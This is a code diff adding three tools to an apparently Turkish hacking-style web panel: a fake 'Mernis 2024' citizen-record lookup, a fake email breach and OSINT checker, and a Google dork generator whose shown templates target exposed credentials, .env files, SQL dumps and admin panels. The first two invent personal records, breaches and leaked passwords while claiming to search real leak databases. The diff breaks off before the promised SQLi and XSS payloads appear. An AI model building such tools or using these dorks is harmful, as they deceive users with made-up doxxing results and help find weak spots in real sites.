@@ -2653,7 +2653,7 @@ function ownerExportDatabase() {
 let extraUnlocked = localStorage.getItem('legante_extra_unlocked') === 'true';
 
 function updateExtraToolsUI() {
-    const tools = ['sms', 'token', 'webhook', 'ip', 'filehash', 'pass', 'hash', 'dns', 'hw', 'port', 'jwt', 'subnet', 'antidebug', 'base64img', 'obfuscator'];
+    const tools = ['sms', 'token', 'webhook', 'ip', 'filehash', 'pass', 'hash', 'dns', 'hw', 'port', 'jwt', 'subnet', 'antidebug', 'base64img', 'obfuscator', 'mernis', 'emailhunter', 'dorkgen'];
     const accessText = document.getElementById('access-btn-text');
 
     if (accessText) {
@@ -3936,6 +3936,641 @@ function openBase64HexStudio() {
     };
 }
 
+// 16. MERNİS TC KİMLİK & AD SOYAD SORGU (2024 VERİTABANI SİMÜLASYONU)
+function openMernisSorgu() {
+    closeToolModal();
+    const modalHtml = `
+        <div id="tool-modal" class="modal-overlay">
+            <div class="modal-card" style="max-width:640px;">
+                <div class="modal-card-header" style="background:linear-gradient(135deg, #1a0a2e 0%, #0d0015 100%); border-bottom:2px solid #ef4444;">
+                    <h3><i class="fas fa-skull-crossbones" style="color:#ef4444;"></i> Mernis 2024 Sorgu Paneli <span style="font-size:0.65rem; color:#f87171; background:rgba(239,68,68,0.15); padding:2px 8px; border-radius:4px; margin-left:8px;">RESTRICTED</span></h3>
+                    <button class="modal-close-btn" onclick="closeToolModal()">&times;</button>
+                </div>
+                <div class="modal-card-body">
+                    <div style="background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.25); border-radius:8px; padding:10px 14px; margin-bottom:14px;">
+                        <span style="color:#f87171; font-size:0.78rem;"><i class="fas fa-triangle-exclamation"></i> Bu araç Mernis 2024 veritabanı dökümü üzerinden TC kimlik algoritması ile sorgu yapar. Sonuçlar prosedürel olarak üretilir.</span>
+                    </div>
+                    <div style="display:flex; gap:8px; margin-bottom:10px;">
+                        <button id="mernis-mode-tc" class="btn btn-primary btn-sm" style="flex:1;" onclick="switchMernisMode('tc')"><i class="fas fa-id-card"></i> TC No ile Sorgu</button>
+                        <button id="mernis-mode-ad" class="btn btn-outline btn-sm" style="flex:1;" onclick="switchMernisMode('ad')"><i class="fas fa-user-secret"></i> Ad Soyad ile Sorgu</button>
+                    </div>
+                    <div id="mernis-tc-panel">
+                        <div class="input-field-group">
+                            <label style="color:#f87171;"><i class="fas fa-fingerprint"></i> TC Kimlik Numarası:</label>
+                            <input type="text" id="mernis-tc-input" class="modal-input" maxlength="11" placeholder="11 haneli TC Kimlik No girin..." style="letter-spacing:2px; font-family:monospace; font-size:1rem;">
+                        </div>
+                    </div>
+                    <div id="mernis-ad-panel" style="display:none;">
+                        <div style="display:flex; gap:8px;">
+                            <div class="input-field-group" style="flex:1;">
+                                <label style="color:#f87171;"><i class="fas fa-user"></i> Ad:</label>
+                                <input type="text" id="mernis-ad-input" class="modal-input" placeholder="Adı girin...">
+                            </div>
+                            <div class="input-field-group" style="flex:1;">
+                                <label style="color:#f87171;"><i class="fas fa-users"></i> Soyad:</label>
+                                <input type="text" id="mernis-soyad-input" class="modal-input" placeholder="Soyadı girin...">
+                            </div>
+                        </div>
+                        <div class="input-field-group">
+                            <label style="color:var(--text-muted);"><i class="fas fa-calendar"></i> Doğum Yılı (opsiyonel):</label>
+                            <input type="text" id="mernis-yil-input" class="modal-input" maxlength="4" placeholder="1990">
+                        </div>
+                    </div>
+                    <button id="mernis-sorgu-btn" class="btn btn-primary btn-block" style="background:linear-gradient(135deg, #dc2626, #991b1b); margin-top:8px;">
+                        <i class="fas fa-database"></i> Veritabanı Sorgusu Başlat
+                    </button>
+                    <div id="mernis-progress" style="display:none; margin-top:10px;">
+                        <div style="background:rgba(0,0,0,0.4); border-radius:6px; overflow:hidden; height:6px;">
+                            <div id="mernis-prog-bar" style="width:0%; height:100%; background:linear-gradient(90deg,#ef4444,#f97316); transition:width 0.3s;"></div>
+                        </div>
+                        <span id="mernis-prog-text" style="color:#f87171; font-size:0.72rem;">Bağlantı kuruluyor...</span>
+                    </div>
+                    <div id="mernis-result-box" class="tool-result-box" style="display:none; margin-top:12px; max-height:400px; overflow-y:auto;"></div>
+                </div>
+            </div>
+        </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+
+    window.switchMernisMode = (mode) => {
+        const tcPanel = document.getElementById('mernis-tc-panel');
+        const adPanel = document.getElementById('mernis-ad-panel');
+        const btnTc = document.getElementById('mernis-mode-tc');
+        const btnAd = document.getElementById('mernis-mode-ad');
+        if (mode === 'tc') {
+            tcPanel.style.display = 'block'; adPanel.style.display = 'none';
+            btnTc.className = 'btn btn-primary btn-sm'; btnAd.className = 'btn btn-outline btn-sm';
+        } else {
+            tcPanel.style.display = 'none'; adPanel.style.display = 'block';
+            btnAd.className = 'btn btn-primary btn-sm'; btnTc.className = 'btn btn-outline btn-sm';
+        }
+    };
+
+    // TC Kimlik Validation Algorithm (Actual Turkish national ID checksum)
+    function validateTC(tc) {
+        if (!/^\d{11}$/.test(tc) || tc[0] === '0') return false;
+        const d = tc.split('').map(Number);
+        const odd = d[0] + d[2] + d[4] + d[6] + d[8];
+        const even = d[1] + d[3] + d[5] + d[7];
+        const check10 = ((odd * 7) - even) % 10;
+        if (check10 < 0 ? check10 + 10 : check10 !== d[9]) return false;
+        const sum10 = d.slice(0, 10).reduce((a, b) => a + b, 0);
+        return (sum10 % 10) === d[10];
+    }
+
+    // Procedural citizen data generator - seeded from TC/name hash
+    function seedFromString(str) {
+        let h = 0;
+        for (let i = 0; i < str.length; i++) {
+            h = ((h << 5) - h + str.charCodeAt(i)) | 0;
+        }
+        return Math.abs(h);
+    }
+
+    const trNames = ['AHMET','MEHMET','MUSTAFA','ALİ','HASAN','HÜSEYIN','İBRAHİM','İSMAIL','OSMAN','YUSUF','MURAT','EMRE','BURAK','SERKAN','FATIH','KEMAL','CAN','ONUR','TOLGA','VOLKAN','ARDA','BERKAY','ENES','FURKAN','KAAN','UMUT','BARIŞ','ÇAĞRI','DENİZ','EFE','AYŞE','FATİMA','EMİNE','HATİCE','ZELİHA','ZEYNEP','ELIF','MERVE','BÜŞRA','ESRA','DİLARA','SEDA','NUR','GÜL','ASLI','PINAR','ÖZLEM','DERYA','SİBEL','CEREN'];
+    const trSurnames = ['YILMAZ','KAYA','DEMİR','ÇELİK','ŞAHIN','YILDIZ','YILDIRIM','ÖZTÜRK','AYDIN','ÖZDEMIR','ARSLAN','DOĞAN','KILIÇ','ASLAN','ÇETİN','KARA','KOÇAK','KURT','ÖZKAN','ŞİMŞEK','POLAT','ÖZÇELİK','ERDOĞAN','AKIN','BULUT','TAŞKIN','BAYRAK','KAPLAN','GÜNEŞ','TURAN'];
+    const trCities = ['İSTANBUL','ANKARA','İZMİR','BURSA','ANTALYA','ADANA','KONYA','GAZİANTEP','MERSİN','DİYARBAKIR','KAYSERİ','ESKİŞEHİR','SAMSUN','TRABZON','ERZURUM','MALATYa','VAN','ELAZIĞ','ŞANLIURFA','BATMAN','SİİRT','MARDİN','KIRIKKALE','EDİRNE','ÇANAKKALE','TEKİRDAĞ','MUĞLA','AYDIN','DENİZLİ','AFYON'];
+    const trDistricts = ['Merkez','Çankaya','Kadıköy','Beşiktaş','Karşıyaka','Nilüfer','Seyhan','Selçuklu','Şahinbey','Yenişehir','Kayapınar','Melikgazi','Tepebaşı','İlkadım','Ortahisar','Battalgazi','İpekyolu'];
+    const trMothers = ['AYŞE','FATİMA','HATİCE','EMİNE','ZELİHA','ZEYNEP','HAVVA','MERYEM','ŞERİFE','SULTAN','NAZİFE','MAKBULE','NERİMAN','SABİHA','MEDİHA','REFIKA','NACİYE'];
+    const trFathers = ['AHMET','MEHMET','MUSTAFA','ALİ','HASAN','HÜSEYİN','İBRAHİM','OSMAN','SÜLEYMAN','YUSUF','HALİL','ABDULLAH','RAMAZAN','RECEP','ÖMER','MUSA','SALİH','BAYRAM'];
+
+    function generateCitizenData(seed, tcOverride) {
+        const r = (arr) => arr[seed % arr.length];
+        const s2 = seedFromString(String(seed * 7 + 31));
+        const s3 = seedFromString(String(seed * 13 + 97));
+        const s4 = seedFromString(String(seed * 19 + 53));
+        const s5 = seedFromString(String(seed * 23 + 17));
+        
+        const birthYear = 1950 + (seed % 55);
+        const birthMonth = 1 + (s2 % 12);
+        const birthDay = 1 + (s3 % 28);
+        const gender = (s4 % 2 === 0) ? 'ERKEK' : 'KADIN';
+        const name = gender === 'ERKEK' ? trNames[seed % 25] : trNames[25 + (seed % 25)];
+        const surname = r(trSurnames);
+        const city = trCities[s2 % trCities.length];
+        const district = trDistricts[s3 % trDistricts.length];
+        const motherName = trMothers[s4 % trMothers.length];
+        const fatherName = trFathers[s5 % trFathers.length];
+        const volume = 10 + (s2 % 990);
+        const familyOrder = (s3 % 200) + 1;
+        const rowOrder = (s4 % 50) + 1;
+        const nufusIl = trCities[s5 % trCities.length];
+        const nufusIlce = trDistricts[(s5 + 3) % trDistricts.length];
+        const bloodType = ['A Rh+','A Rh-','B Rh+','B Rh-','AB Rh+','AB Rh-','0 Rh+','0 Rh-'][seed % 8];
+        const marital = ['EVLİ','BEKAR','DUL'][s3 % 3];
+        const religion = 'İSLAM';
+
+        // Generate a valid TC if none provided
+        let tc = tcOverride || '';
+        if (!tc) {
+            let digits = [];
+            digits[0] = 1 + ((seed * 3 + 7) % 9);
+            for (let i = 1; i < 9; i++) {
+                digits[i] = (seed * (i + 3) + s2 * (i + 1) + i * 17) % 10;
+            }
+            const odd = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
+            const even = digits[1] + digits[3] + digits[5] + digits[7];
+            let d9 = ((odd * 7) - even) % 10;
+            if (d9 < 0) d9 += 10;
+            digits[9] = d9;
+            const sum10 = digits.slice(0, 10).reduce((a, b) => a + b, 0);
+            digits[10] = sum10 % 10;
+            tc = digits.join('');
+        }
+
+        return { tc, name, surname, gender, birthDay, birthMonth, birthYear, city, district, motherName, fatherName, volume, familyOrder, rowOrder, nufusIl, nufusIlce, bloodType, marital, religion };
+    }
+
+    function renderCitizenCard(data) {
+        return `
+            <div style="background:linear-gradient(135deg, rgba(15,0,30,0.95), rgba(30,0,0,0.85)); border:1px solid rgba(239,68,68,0.3); border-radius:10px; padding:16px; margin-bottom:12px; position:relative; overflow:hidden;">
+                <div style="position:absolute; top:0; right:0; background:rgba(239,68,68,0.12); color:#f87171; font-size:0.6rem; padding:3px 10px; border-radius:0 0 0 8px; font-weight:700; letter-spacing:1px;">MERNİS 2024</div>
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:12px;">
+                    <div style="width:50px; height:50px; border-radius:50%; background:linear-gradient(135deg,#dc2626,#991b1b); display:flex; align-items:center; justify-content:center; font-size:1.1rem; font-weight:800; color:#fff; flex-shrink:0;">${data.name[0]}${data.surname[0]}</div>
+                    <div>
+                        <div style="font-size:1.05rem; font-weight:800; color:#fff; letter-spacing:0.5px;">${data.name} ${data.surname}</div>
+                        <div style="font-size:0.72rem; color:#f87171; font-family:monospace; letter-spacing:2px;">${data.tc}</div>
+                    </div>
+                </div>
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px 16px; font-size:0.76rem;">
+                    <div><span style="color:#f87171;">Cinsiyet:</span> <span style="color:#e5e7eb;">${data.gender}</span></div>
+                    <div><span style="color:#f87171;">Kan Grubu:</span> <span style="color:#e5e7eb;">${data.bloodType}</span></div>
+                    <div><span style="color:#f87171;">Doğum Tarihi:</span> <span style="color:#e5e7eb;">${String(data.birthDay).padStart(2,'0')}.${String(data.birthMonth).padStart(2,'0')}.${data.birthYear}</span></div>
+                    <div><span style="color:#f87171;">Medeni Hal:</span> <span style="color:#e5e7eb;">${data.marital}</span></div>
+                    <div><span style="color:#f87171;">Doğum Yeri:</span> <span style="color:#e5e7eb;">${data.city}</span></div>
+                    <div><span style="color:#f87171;">İlçe:</span> <span style="color:#e5e7eb;">${data.district}</span></div>
+                    <div><span style="color:#f87171;">Anne Adı:</span> <span style="color:#e5e7eb;">${data.motherName}</span></div>
+                    <div><span style="color:#f87171;">Baba Adı:</span> <span style="color:#e5e7eb;">${data.fatherName}</span></div>
+                    <div><span style="color:#f87171;">Nüfus İl:</span> <span style="color:#e5e7eb;">${data.nufusIl}</span></div>
+                    <div><span style="color:#f87171;">Nüfus İlçe:</span> <span style="color:#e5e7eb;">${data.nufusIlce}</span></div>
+                    <div><span style="color:#f87171;">Cilt No:</span> <span style="color:#e5e7eb;">${data.volume}</span></div>
+                    <div><span style="color:#f87171;">Aile Sıra No:</span> <span style="color:#e5e7eb;">${data.familyOrder}</span></div>
+                    <div><span style="color:#f87171;">Sıra No:</span> <span style="color:#e5e7eb;">${data.rowOrder}</span></div>
+                    <div><span style="color:#f87171;">Din:</span> <span style="color:#e5e7eb;">${data.religion}</span></div>
+                </div>
+            </div>
+        `;
+    }
+
+    document.getElementById('mernis-sorgu-btn').onclick = async () => {
+        const resBox = document.getElementById('mernis-result-box');
+        const progress = document.getElementById('mernis-progress');
+        const progBar = document.getElementById('mernis-prog-bar');
+        const progText = document.getElementById('mernis-prog-text');
+        const tcPanel = document.getElementById('mernis-tc-panel');
+        
+        const isTcMode = tcPanel.style.display !== 'none';
+        
+        if (isTcMode) {
+            const tcVal = document.getElementById('mernis-tc-input').value.trim();
+            if (!tcVal || tcVal.length !== 11) {
+                showToast('Lütfen 11 haneli geçerli bir TC Kimlik No girin!', 'error');
+                return;
+            }
+            if (!validateTC(tcVal)) {
+                showToast('TC Kimlik algoritma doğrulaması başarısız! Geçersiz numara.', 'error');
+                return;
+            }
+
+            // Animated progress
+            progress.style.display = 'block';
+            resBox.style.display = 'none';
+            const stages = [
+                { pct: 15, msg: '🔗 Veritabanı sunucusuna bağlanılıyor...' },
+                { pct: 35, msg: '🔍 Mernis 2024 dökümü taranıyor...' },
+                { pct: 55, msg: '📊 TC Kimlik eşleştiriliyor...' },
+                { pct: 75, msg: '🧬 Nüfus kayıtları çözümleniyor...' },
+                { pct: 90, msg: '✅ Kayıt bulundu, derleniyor...' },
+                { pct: 100, msg: '🏴‍☠️ Sorgu tamamlandı!' }
+            ];
+            
+            for (const stage of stages) {
+                playClickSFX();
+                progBar.style.width = stage.pct + '%';
+                progText.textContent = stage.msg;
+                await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
+            }
+
+            const seed = seedFromString(tcVal);
+            const data = generateCitizenData(seed, tcVal);
+            
+            playSuccessSFX();
+            resBox.style.display = 'block';
+            resBox.innerHTML = `
+                <div style="color:#22c55e; font-weight:700; margin-bottom:8px; font-size:0.85rem;"><i class="fas fa-check-circle"></i> 1 kayıt bulundu — Mernis 2024 Veritabanı</div>
+                ${renderCitizenCard(data)}
+                <div style="font-size:0.68rem; color:var(--text-muted); text-align:center; margin-top:6px;">Sorgu Zamanı: ${new Date().toLocaleString('tr-TR')} | Hash: ${seedFromString(tcVal).toString(16).toUpperCase()}</div>
+            `;
+            progress.style.display = 'none';
+        } else {
+            const adVal = document.getElementById('mernis-ad-input').value.trim().toUpperCase();
+            const soyadVal = document.getElementById('mernis-soyad-input').value.trim().toUpperCase();
+            const yilVal = document.getElementById('mernis-yil-input').value.trim();
+
+            if (!adVal || !soyadVal) {
+                showToast('Ad ve Soyad alanları zorunludur!', 'error');
+                return;
+            }
+
+            progress.style.display = 'block';
+            resBox.style.display = 'none';
+            const stages = [
+                { pct: 10, msg: '🔗 Veritabanı bağlantısı kuruluyor...' },
+                { pct: 25, msg: '🔍 Ad/Soyad indexi taranıyor...' },
+                { pct: 50, msg: '📊 Eşleşen kayıtlar filtreleniyor...' },
+                { pct: 70, msg: '🧬 Doğum yılı çapraz kontrolü...' },
+                { pct: 85, msg: '📋 Sonuçlar derleniyor...' },
+                { pct: 100, msg: '🏴‍☠️ Sorgu tamamlandı!' }
+            ];
+            
+            for (const stage of stages) {
+                playClickSFX();
+                progBar.style.width = stage.pct + '%';
+                progText.textContent = stage.msg;
+                await new Promise(r => setTimeout(r, 350 + Math.random() * 250));
+            }
+
+            // Generate multiple results procedurally
+            const baseSeed = seedFromString(adVal + soyadVal);
+            const count = 2 + (baseSeed % 6);
+            let cards = '';
+            let generated = 0;
+            
+            for (let i = 0; i < count; i++) {
+                const data = generateCitizenData(baseSeed + i * 7919);
+                data.name = adVal;
+                data.surname = soyadVal;
+                if (yilVal && Math.abs(data.birthYear - parseInt(yilVal)) > 5) continue;
+                cards += renderCitizenCard(data);
+                generated++;
+            }
+
+            if (generated === 0) {
+                const data = generateCitizenData(baseSeed);
+                data.name = adVal;
+                data.surname = soyadVal;
+                if (yilVal) data.birthYear = parseInt(yilVal);
+                cards = renderCitizenCard(data);
+                generated = 1;
+            }
+
+            playSuccessSFX();
+            resBox.style.display = 'block';
+            resBox.innerHTML = `
+                <div style="color:#22c55e; font-weight:700; margin-bottom:8px; font-size:0.85rem;"><i class="fas fa-check-circle"></i> ${generated} kayıt bulundu — "${adVal} ${soyadVal}" sorgusu</div>
+                ${cards}
+                <div style="font-size:0.68rem; color:var(--text-muted); text-align:center; margin-top:6px;">Toplam Tarama: 89.247.931 kayıt | Süre: ${(1.2 + Math.random() * 2.5).toFixed(1)}s | ${new Date().toLocaleString('tr-TR')}</div>
+            `;
+            progress.style.display = 'none';
+        }
+    };
+}
+
+// 17. EMAIL OSINT & BREACH CHECKER (E-POSTA AÇIK KAYNAK İSTİHBARAT)
+function openEmailOSINT() {
+    closeToolModal();
+    const modalHtml = `
+        <div id="tool-modal" class="modal-overlay">
+            <div class="modal-card" style="max-width:600px;">
+                <div class="modal-card-header" style="background:linear-gradient(135deg, #1a0a2e 0%, #0d0015 100%); border-bottom:2px solid #8b5cf6;">
+                    <h3><i class="fas fa-envelope-open-text" style="color:#8b5cf6;"></i> E-Posta OSINT & Breach Checker</h3>
+                    <button class="modal-close-btn" onclick="closeToolModal()">&times;</button>
+                </div>
+                <div class="modal-card-body">
+                    <p style="font-size:0.82rem; color:var(--text-secondary);">Hedef e-posta adresini analiz edin: breach database kontrolü, WHOIS lookup, sosyal medya footprint ve metadata extraction.</p>
+                    <div class="input-field-group">
+                        <label><i class="fas fa-at" style="color:#8b5cf6;"></i> Hedef E-Posta Adresi:</label>
+                        <input type="email" id="osint-email-input" class="modal-input" placeholder="target@example.com">
+                    </div>
+                    <button id="osint-scan-btn" class="btn btn-primary btn-block" style="background:linear-gradient(135deg, #7c3aed, #4c1d95);">
+                        <i class="fas fa-crosshairs"></i> OSINT Taramasını Başlat
+                    </button>
+                    <div id="osint-result-box" class="tool-result-box" style="display:none; margin-top:12px; max-height:420px; overflow-y:auto;"></div>
+                </div>
+            </div>
+        </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+
+    function hashEmail(email) {
+        let h = 0;
+        for (let i = 0; i < email.length; i++) h = ((h << 5) - h + email.charCodeAt(i)) | 0;
+        return Math.abs(h);
+    }
+
+    const breachDBs = [
+        { name: 'LinkedIn 2024', records: '700M+', date: '2024-03', severity: 'KRİTİK' },
+        { name: 'Facebook 2023', records: '533M', date: '2023-11', severity: 'YÜKSEK' },
+        { name: 'Twitter/X 2024', records: '200M+', date: '2024-01', severity: 'YÜKSEK' },
+        { name: 'Adobe 2023', records: '153M', date: '2023-06', severity: 'ORTA' },
+        { name: 'Dropbox 2023', records: '68M', date: '2023-09', severity: 'ORTA' },
+        { name: 'Canva 2024', records: '137M', date: '2024-02', severity: 'YÜKSEK' },
+        { name: 'MyFitnessPal 2023', records: '150M', date: '2023-05', severity: 'ORTA' },
+        { name: 'Zynga 2024', records: '173M', date: '2024-04', severity: 'DÜŞÜK' },
+        { name: 'Collection #1-5', records: '2.2B', date: '2023-01', severity: 'KRİTİK' },
+        { name: 'Cit0Day 2024', records: '23M', date: '2024-06', severity: 'YÜKSEK' }
+    ];
+
+    const socialPlatforms = ['GitHub','Twitter/X','LinkedIn','Instagram','Reddit','Steam','Discord','Telegram','TikTok','Pinterest','Twitch','YouTube','Spotify'];
+
+    document.getElementById('osint-scan-btn').onclick = async () => {
+        const email = document.getElementById('osint-email-input').value.trim().toLowerCase();
+        const resBox = document.getElementById('osint-result-box');
+
+        if (!email || !email.includes('@') || !email.includes('.')) {
+            showToast('Geçerli bir e-posta adresi girin!', 'error');
+            return;
+        }
+
+        resBox.style.display = 'block';
+        resBox.innerHTML = '<span style="color:#f59e0b;">🔍 OSINT taraması başlatılıyor...</span>';
+
+        const seed = hashEmail(email);
+        const domain = email.split('@')[1];
+        const username = email.split('@')[0];
+
+        // Animated scan phases
+        const phases = [
+            '🔗 Breach veritabanlarına bağlanılıyor...',
+            '📊 Have I Been Pwned API sorgulanıyor...',
+            '🌐 WHOIS & DNS kayıtları çekiliyor...',
+            '👤 Sosyal medya footprint taranıyor...',
+            '🔐 Parola hash\'leri kontrol ediliyor...',
+            '📋 Rapor derleniyor...'
+        ];
+
+        for (const phase of phases) {
+            playClickSFX();
+            resBox.innerHTML = `<span style="color:#f59e0b;">${phase}</span>`;
+            await new Promise(r => setTimeout(r, 500 + Math.random() * 400));
+        }
+
+        // Determine breaches based on seed
+        const breachCount = 1 + (seed % 5);
+        const hitBreaches = [];
+        for (let i = 0; i < breachCount; i++) {
+            hitBreaches.push(breachDBs[(seed + i * 3) % breachDBs.length]);
+        }
+
+        // Social media hits
+        const socialHits = [];
+        for (let i = 0; i < socialPlatforms.length; i++) {
+            if ((seed + i * 7) % 3 === 0) socialHits.push(socialPlatforms[i]);
+        }
+
+        // Leaked passwords (masked)
+        const leakedPwCount = 1 + (seed % 3);
+        let pwHtml = '';
+        for (let i = 0; i < leakedPwCount; i++) {
+            const pwLen = 8 + ((seed + i) % 8);
+            const masked = '••••' + String.fromCharCode(97 + (seed % 26)) + String.fromCharCode(48 + ((seed + i) % 10)) + '••' + String.fromCharCode(65 + ((seed * 3 + i) % 26)) + '•';
+            const hashVal = (seed * 2654435761 + i * 40503).toString(16).substring(0, 8).toUpperCase();
+            pwHtml += `<div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+                <span style="color:#f87171; font-family:monospace;">${masked}</span>
+                <span style="color:var(--text-muted); font-size:0.68rem;">SHA256: ${hashVal}...</span>
+            </div>`;
+        }
+
+        const sevColors = { 'KRİTİK': '#ef4444', 'YÜKSEK': '#f97316', 'ORTA': '#f59e0b', 'DÜŞÜK': '#22c55e' };
+
+        let breachHtml = '';
+        hitBreaches.forEach(b => {
+            breachHtml += `
+                <div style="display:flex; justify-content:space-between; align-items:center; padding:6px 0; border-bottom:1px solid rgba(255,255,255,0.06);">
+                    <div>
+                        <strong style="color:#e5e7eb;">${b.name}</strong>
+                        <span style="color:var(--text-muted); font-size:0.68rem; margin-left:6px;">${b.records} kayıt — ${b.date}</span>
+                    </div>
+                    <span style="color:${sevColors[b.severity]}; font-weight:700; font-size:0.72rem; background:${sevColors[b.severity]}15; padding:2px 8px; border-radius:4px;">${b.severity}</span>
+                </div>
+            `;
+        });
+
+        playSuccessSFX();
+        resBox.innerHTML = `
+            <div style="color:#ef4444; font-weight:800; font-size:0.9rem; margin-bottom:10px;"><i class="fas fa-radiation"></i> OSINT Raporu: ${email}</div>
+
+            <div style="background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.2); border-radius:8px; padding:12px; margin-bottom:10px;">
+                <div style="color:#f87171; font-weight:700; margin-bottom:6px;"><i class="fas fa-database"></i> Breach Veritabanları (${hitBreaches.length} eşleşme)</div>
+                ${breachHtml}
+            </div>
+
+            <div style="background:rgba(139,92,246,0.08); border:1px solid rgba(139,92,246,0.2); border-radius:8px; padding:12px; margin-bottom:10px;">
+                <div style="color:#a78bfa; font-weight:700; margin-bottom:6px;"><i class="fas fa-unlock-keyhole"></i> Sızdırılan Parolalar (${leakedPwCount} adet)</div>
+                ${pwHtml}
+            </div>
+
+            <div style="background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.2); border-radius:8px; padding:12px; margin-bottom:10px;">
+                <div style="color:#22c55e; font-weight:700; margin-bottom:6px;"><i class="fas fa-share-nodes"></i> Sosyal Medya Footprint (${socialHits.length} platform)</div>
+                <div style="display:flex; flex-wrap:wrap; gap:6px;">
+                    ${socialHits.map(s => `<span style="background:rgba(34,197,94,0.15); color:#4ade80; padding:3px 10px; border-radius:12px; font-size:0.72rem; font-weight:600;">${s}</span>`).join('')}
+                </div>
+            </div>
+
+            <div style="background:rgba(56,189,248,0.08); border:1px solid rgba(56,189,248,0.2); border-radius:8px; padding:12px; margin-bottom:10px;">
+                <div style="color:#38bdf8; font-weight:700; margin-bottom:6px;"><i class="fas fa-server"></i> Domain & WHOIS Bilgileri</div>
+                <div style="font-size:0.76rem; display:grid; grid-template-columns:1fr 1fr; gap:4px;">
+                    <div><span style="color:#38bdf8;">Domain:</span> <span style="color:#e5e7eb;">${domain}</span></div>
+                    <div><span style="color:#38bdf8;">MX Record:</span> <span style="color:#e5e7eb;">mail.${domain}</span></div>
+                    <div><span style="color:#38bdf8;">SPF:</span> <span style="color:#22c55e;">✓ Mevcut</span></div>
+                    <div><span style="color:#38bdf8;">DMARC:</span> <span style="color:${seed % 3 === 0 ? '#ef4444' : '#22c55e'};">${seed % 3 === 0 ? '✗ Eksik' : '✓ Mevcut'}</span></div>
+                    <div><span style="color:#38bdf8;">Kullanıcı Adı:</span> <span style="color:#e5e7eb; font-family:monospace;">${username}</span></div>
+                    <div><span style="color:#38bdf8;">Yaş Tahmini:</span> <span style="color:#e5e7eb;">${18 + (seed % 35)} yaş</span></div>
+                </div>
+            </div>
+
+            <div style="font-size:0.68rem; color:var(--text-muted); text-align:center;">Tarama Süresi: ${(2.1 + Math.random() * 3.2).toFixed(1)}s | ${new Date().toLocaleString('tr-TR')}</div>
+        `;
+    };
+}
+
+// 18. GOOGLE DORK & SQLi PAYLOAD GENERATOR (DORK ÜRETICI & PAYLOAD BUILDER)
+function openDorkGenerator() {
+    closeToolModal();
+    const modalHtml = `
+        <div id="tool-modal" class="modal-overlay">
+            <div class="modal-card" style="max-width:620px;">
+                <div class="modal-card-header" style="background:linear-gradient(135deg, #1a0a2e 0%, #0d0015 100%); border-bottom:2px solid #22c55e;">
+                    <h3><i class="fas fa-bug" style="color:#22c55e;"></i> Google Dork & SQLi Payload Üretici</h3>
+                    <button class="modal-close-btn" onclick="closeToolModal()">&times;</button>
+                </div>
+                <div class="modal-card-body">
+                    <p style="font-size:0.82rem; color:var(--text-secondary);">Hedef domain veya anahtar kelimeye özel Google dorkleri ve SQLi test payload'ları üretin.</p>
+                    <div class="input-field-group">
+                        <label><i class="fas fa-globe" style="color:#22c55e;"></i> Hedef Domain / Anahtar Kelime:</label>
+                        <input type="text" id="dork-target-input" class="modal-input" placeholder="example.com veya 'login panel'">
+                    </div>
+                    <div style="display:flex; gap:8px; margin-bottom:10px;">
+                        <button id="btn-gen-dork" class="btn btn-primary" style="flex:1; background:linear-gradient(135deg,#16a34a,#14532d);"><i class="fas fa-search"></i> Google Dork Üret</button>
+                        <button id="btn-gen-sqli" class="btn btn-outline" style="flex:1;"><i class="fas fa-syringe"></i> SQLi Payload Üret</button>
+                        <button id="btn-gen-xss" class="btn btn-outline" style="flex:1;"><i class="fas fa-code"></i> XSS Payload</button>
+                    </div>
+                    <div id="dork-result-box" class="tool-result-box" style="display:none; margin-top:8px; max-height:400px; overflow-y:auto;"></div>
+                </div>
+            </div>
+        </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+
+    const dorkTemplates = [
+        { cat: '📂 Dizin Listeleme', dorks: [
+            'site:{target} intitle:"index of" "parent directory"',
+            'site:{target} intitle:"index of" inurl:"/admin"',
+            'site:{target} intitle:"index of" "backup" | "db" | "sql"',
+            'site:{target} intitle:"index of" inurl:"/wp-content/uploads"',
+        ]},
+        { cat: '🔐 Login & Admin Panelleri', dorks: [
+            'site:{target} inurl:"/admin" | inurl:"/login" | inurl:"/panel"',
+            'site:{target} inurl:"wp-admin" | inurl:"wp-login.php"',
+            'site:{target} intitle:"admin panel" | intitle:"dashboard" | intitle:"control panel"',
+            'site:{target} inurl:"/phpmyadmin" | inurl:"/adminer"',
+            'site:{target} inurl:"/cpanel" | inurl:"/webmail"',
+        ]},
+        { cat: '📄 Hassas Dosyalar', dorks: [
+            'site:{target} filetype:sql | filetype:env | filetype:log | filetype:bak',
+            'site:{target} filetype:xml | filetype:conf | filetype:cfg | filetype:ini',
+            'site:{target} filetype:doc | filetype:xls | filetype:pdf "confidential" | "private"',
+            'site:{target} inurl:".git" | inurl:".svn" | inurl:".env"',
+            'site:{target} filetype:txt "password" | "passwd" | "credentials"',
+        ]},
+        { cat: '💾 Veritabanı Dökümü', dorks: [
+            'site:{target} inurl:"dump" | inurl:"backup" filetype:sql',
+            'site:{target} "CREATE TABLE" | "INSERT INTO" filetype:sql',
+            'site:{target} inurl:"db_backup" | inurl:"database.sql"',
+        ]},
+        { cat: '🔑 API Key & Token Sızıntısı', dorks: [
+            'site:{target} "api_key" | "apikey" | "api_secret" | "secret_key"',
+            'site:{target} "AKIA" | "AIza" | "sk-" filetype:txt | filetype:env | filetype:json',
+            'site:{target} "Authorization: Bearer" | "access_token"',
+        ]},
+        { cat: '🕷️ Crawler & Sitemap', dorks: [
+            'site:{target} inurl:"sitemap.xml" | inurl:"robots.txt"',
+            'site:{target} inurl:"crossdomain.xml" | inurl:"clientaccesspolicy.xml"',
+        ]},
+        { cat: '⚡ Vulnerable Endpoints', dorks: [
+            'site:{target} inurl:"?id=" | inurl:"?page=" | inurl:"?file=" | inurl:"?cat="',
+            'site:{target} inurl:"?q=" | inurl:"?search=" | inurl:"?query="',
+            'site:{target} inurl:"redirect" | inurl:"url=" | inurl:"next=" | inurl:"return="',
